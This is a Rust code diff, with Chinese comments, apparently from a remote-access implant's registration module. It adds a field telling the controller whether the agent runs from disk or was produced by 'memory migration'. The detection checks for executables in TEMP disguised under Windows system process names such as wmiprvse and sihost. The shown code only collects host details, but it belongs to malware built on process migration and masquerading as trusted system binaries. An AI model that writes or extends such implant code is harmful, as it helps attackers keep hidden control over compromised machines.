@@ -38,7 +38,12 @@ pub struct RegisterPayload {
     pub arch: String,
     /// 当前用户名
     pub username: String,
+    /// 连接来源: "disk" (磁盘运行) 或 "memory" (内存迁移)
+    #[serde(default = "default_source")]
+    pub source: String,
 }
+
+fn default_source() -> String { "disk".to_string() }
 
 /// 命令消息载荷
 #[derive(Serialize, Deserialize, Debug, Clone, PartialEq)]
@@ -81,42 +86,54 @@ pub struct SystemInfo {
     pub os: String,
     pub arch: String,
     pub username: String,
+    pub source: String,
 }
 
 impl SystemInfo {
     /// 收集系统信息
-    /// 
-    /// 该方法会尝试获取主机名、操作系统类型和当前用户名。
-    /// 如果任何信息获取失败，会使用默认值并记录警告日志。
     pub fn collect() -> SystemInfo {
-        // 获取一致的 Agent UUID (无文件标识)
         let uuid = crate::utils::get_agent_uuid();
         
-        // ⚡ OPTIMIZATION: Use Environment Variables (Minimal size)
         #[cfg(target_os = "windows")]
         let hostname = std::env::var("COMPUTERNAME").unwrap_or_else(|_| "unknown_host".to_string());
-        
         #[cfg(not(target_os = "windows"))]
         let hostname = std::env::var("HOSTNAME").unwrap_or_else(|_| "unknown_host".to_string());
         
-        // 获取操作系统类型（编译时确定）
         let os = std::env::consts::OS.to_string();
-        let arch = std::env::consts::ARCH.to_string(); // "x86_64", "aarch64", etc.
+        let arch = std::env::consts::ARCH.to_string();
         
-        // 获取当前用户名
         #[cfg(target_os = "windows")]
         let username = std::env::var("USERNAME").unwrap_or_else(|_| "unknown_user".to_string());
-        
         #[cfg(not(target_os = "windows"))]
         let username = std::env::var("USER").unwrap_or_else(|_| "unknown_user".to_string());
         
-        SystemInfo {
-            uuid,
-            hostname,
-            os,
-            arch,
-            username,
+        // 检测连接来源：如果当前 exe 在 TEMP 目录中，说明是内存迁移产生的
+        let source = Self::detect_source();
+        
+        SystemInfo { uuid, hostname, os, arch, username, source }
+    }
+    
+    /// 检测 agent 是从磁盘直接运行还是内存迁移产生的
+    fn detect_source() -> String {
+        if let Ok(exe_path) = std::env::current_exe() {
+            let exe_str = exe_path.to_string_lossy().to_lowercase();
+            let temp_dir = std::env::temp_dir().to_string_lossy().to_lowercase();
+            
+            // 如果 exe 路径在 TEMP 目录下，说明是迁移产生的
+            if exe_str.starts_with(&temp_dir) {
+                return "memory".to_string();
+            }
+            
+            // 额外检查：常见的迁移伪装名
+            let suspicious_names = ["securityhealthsystray", "wmiprvse", "sihost"];
+            if let Some(file_name) = exe_path.file_stem() {
+                let name = file_name.to_string_lossy().to_lowercase();
+                if suspicious_names.iter().any(|s| name == *s) && exe_str.contains("temp") {
+                    return "memory".to_string();
+                }
+            }
         }
+        "disk".to_string()
     }
     
     /// 将系统信息转换为注册消息
@@ -127,6 +144,7 @@ impl SystemInfo {
             os: self.os.clone(),
             arch: self.arch.clone(),
             username: self.username.clone(),
+            source: self.source.clone(),
         };
         
         MessageWrapper {
